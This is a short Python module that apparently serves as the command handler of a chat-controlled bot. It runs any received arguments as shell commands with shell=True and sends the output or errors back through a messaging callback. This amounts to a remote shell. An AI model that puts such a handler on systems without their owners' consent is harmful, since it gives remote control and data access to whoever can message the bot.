import subprocess
import os, requests
class Execute():
	def __init__(self, _):
		self._ = _
		self.args = _.args
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		if self.args[-1] == "-":
			wait = False
			self.args.pop()
		else:
			wait = True
		if self.args[0] == "cd" and len(self.args) > 1:
			self.args.remove(self.args[0])
			if len(self.args) != 0:
				os.chdir(" ".join(self.args))
				result = "%E2%9C%94%EF%B8%8F Command Executed Successfully"
				self._.Send_Message(result)
		cmd = " ".join(self.args)
		sub = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, encoding='iso-8859-2')
		if wait == True:
			output , error = sub.communicate()
			if error:
				result = "%F0%9F%96%A5 Command Error : \n"
				result += error
				self._.Send_Message(result)
			if output:
				result = "%F0%9F%96%A5 Command Output : \n"
				result += output
				self._.Send_Message(result)
			else:
				result = "%E2%9C%94%EF%B8%8F Command Executed Successfully"
				self._.Send_Message(result)
		else:
			result = "%E2%9C%94%EF%B8%8F Command Executed Successfully"
			self._.Send_Message(result)
